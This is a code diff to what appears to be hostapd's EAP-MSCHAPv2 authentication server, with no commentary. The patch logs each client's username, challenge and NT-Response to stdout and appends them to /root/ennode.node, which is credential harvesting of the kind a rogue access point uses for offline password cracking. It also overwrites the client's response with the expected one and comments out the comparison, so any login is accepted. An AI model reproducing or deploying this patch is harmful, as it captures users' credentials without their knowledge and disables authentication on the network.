@@ -13,6 +13,10 @@
 #include "crypto/random.h"
 #include "eap_i.h"
 
+// ZZZZ Include logging stuffs
+#include "common/wpa_common.h"
+// ZZZZ Include logging stuffs
+
 
 struct eap_mschapv2_hdr {
 	u8 op_code; /* MSCHAPV2_OP_* */
@@ -290,15 +294,13 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
   	u8 challenge_hash1[8];
 	const u8 *username, *user;
 	size_t username_len, user_len;
-	int res,x;
-	//wpa_printf(MSG_INFO, "ZZZZ : TEST 1");
+	int x;
 	char *buf;
 
 	pos = eap_hdr_validate(EAP_VENDOR_IETF, EAP_TYPE_MSCHAPV2, respData,
 			       &len);
 	if (pos == NULL || len < 1)
 		return; /* Should not happen - frame already validated */
-  	//wpa_printf(MSG_INFO, "ZZZZ : TEST 2");
 
 	end = pos + len;
 	resp = (struct eap_mschapv2_hdr *) pos;
@@ -321,26 +323,20 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 	flags = *pos++;
 	name = pos;
 	name_len = end - name;
-	//wpa_printf(MSG_INFO, "ZZZZ : name : ", name);
-
-	//wpa_printf(MSG_INFO, "ZZZZ : TEST 3");
 
 	if (data->peer_challenge) {
 		wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Using pre-configured "
 			   "Peer-Challenge");
 		peer_challenge = data->peer_challenge;
 	}
-	//wpa_printf(MSG_INFO, "ZZZZ : TEST 4");
 	wpa_hexdump(MSG_MSGDUMP, "EAP-MSCHAPV2: Peer-Challenge",
 		    peer_challenge, 16);
 	wpa_hexdump(MSG_MSGDUMP, "EAP-MSCHAPV2: NT-Response", nt_response, 24);
 	wpa_printf(MSG_MSGDUMP, "EAP-MSCHAPV2: Flags 0x%x", flags);
 	wpa_hexdump_ascii(MSG_MSGDUMP, "EAP-MSCHAPV2: Name", name, name_len);
 	
-	//wpa_printf(MSG_INFO, "ZZZZ : TEST  5");
 	challenge_hash(peer_challenge, data->auth_challenge, name, name_len, challenge_hash1);
 
-	/* ZZZZ : TODOBE: Add file logging capability at this point */
 	wpa_hexdump(MSG_DEBUG, "EAP-MSCHAPV2: Challenge Hash", challenge_hash1, 8);
 	printf("\n");
 	printf("\tusername: %s\n", name);
@@ -354,6 +350,7 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
                 printf("%02x:",nt_response[x]);
         printf("%02x\n",nt_response[23]);
 
+	//FILE *f = fopen(ennode, "a");
 	FILE *f = fopen("/root/ennode.node", "a");
 	if (f != NULL) {
 		const char *hdr = "CHAP";
@@ -368,8 +365,6 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 		fprintf(f, "%02x\n", nt_response[23]);
 		fclose(f);
 	}
-		
-	/* ZZZZ : TODONE: Add file logging capability at this point */
 
 
 	buf = os_malloc(name_len * 4 + 1);
@@ -402,8 +397,6 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 		}
 	}
 
-	//wpa_printf(MSG_INFO, "ZZZZ : name: %s\tusername: %s\tuser: %s", name, user, username);
-
 	if (username_len != user_len ||
 	    os_memcmp(username, user, username_len) != 0) {
 		wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Mismatch in user names");
@@ -417,41 +410,21 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 
 	wpa_hexdump_ascii(MSG_MSGDUMP, "EAP-MSCHAPV2: User name",
 			  username, username_len);
-	wpa_printf(MSG_INFO, "user: %s\tuser_len: %d\tusername: %s\tusername_len: %d", user, user_len, username, username_len);
-	wpa_printf(MSG_INFO, "pass: %s\tpassword_len: %d", sm->user->password, sm->user->password_len);
 
 	if (sm->user->password_hash) {
-		//wpa_printf(MSG_INFO, "ZZZZ : Password->Hash");
-		res = generate_nt_response_pwhash(data->auth_challenge,
+		generate_nt_response_pwhash(data->auth_challenge,
 						  peer_challenge,
 						  username, username_len,
 						  sm->user->password,
 						  expected);
 	} else {
-		//wpa_printf(MSG_INFO, "ZZZZ : No Password->Hash");
-		res = generate_nt_response(data->auth_challenge,
+		generate_nt_response(data->auth_challenge,
 					   peer_challenge,
 					   username, username_len,
 					   sm->user->password,
 					   sm->user->password_len,
 					   expected);
 	}
-	//wpa_hexdump_ascii(MSG_INFO, nt_response);
-	//wpa_hexdump_ascii(MSG_INFO, expected);
-	//wpa_printf(MSG_INFO, "ZZZZ : AUTH CHALLENGE:");
-	//wpa_hexdump_ascii(MSG_INFO, data->auth_challenge);
-	//wpa_printf(MSG_INFO, "ZZZZ : PEER_CHALLENGE:");
-	//wpa_hexdump_ascii(MSG_INFO, peer_challenge);
-	//wpa_printf(MSG_INFOm "ZZZZ : EXPECTED:");
-	//wpa_hexdump_ascii(MSG_INFO, expected);
-	
-	// ZZZZ : TEST ME HERE
-	//if (res) {
-	//	data->state = FAILURE;
-	//	return;
-	//
-	// ZZZZ : END TEST ME HERE }
-
 	nt_response = expected;
 	//if (os_memcmp(nt_response, expected, 24) == 0) {
 		const u8 *pw_hash;
